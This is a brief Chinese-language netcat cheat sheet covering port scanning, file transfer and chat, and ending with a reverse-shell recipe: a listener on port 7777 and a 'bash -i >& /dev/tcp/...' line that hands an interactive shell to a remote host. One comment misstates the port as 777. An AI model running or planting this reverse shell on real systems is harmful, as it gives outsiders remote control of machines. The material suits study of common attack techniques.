
##linux nc反弹shell

```
nc --help

v1.10-41.1]

想要连接到某处: nc [-options] hostname port[s] [ports] …
绑定端口等待连接: nc -l -p port [-options] [hostname] [port]
-l 监听模式，用于入站连接
-n 指定数字的IP地址，不能用hostname
-o file 记录16进制的传输
-i secs 延时的间隔
-p port 本地端口号
-r 任意指定本地及远程端口
-s addr 本地源地址
-u UDP模式
-v 详细输出 用两个-
-z 将输入输出关掉——用于扫描模式，其中端口号可以指定一个或者用lo-hi式的指定范围。



```

简单用法：

####端口扫描
```
nc -v -w 2 192.168.0.1 -z 80-85
```
####从1拷贝到2：
```
nc -l 1234 > test.txt

nc 192.168.0.1 < test.txt
```
####聊天工具：
```
192.168.0.1 nc -l 222

192.168.0.2 nc 192.168.0.1 222
```
####nc 传文件：
```
发送端 cat 1.txt |nc -l 222
接收端 nc 192.168.0.1 222 > 1.txt

或者

发送端 cat 1.txt |nc 192.168.0.1 222
接收端 nc -l 222 > 1.txt
````
###反弹shell
```
nc -lvp 7777 #监听777

bash -i >& /dev/tcp/192.168.0.4/7777 0>&1
```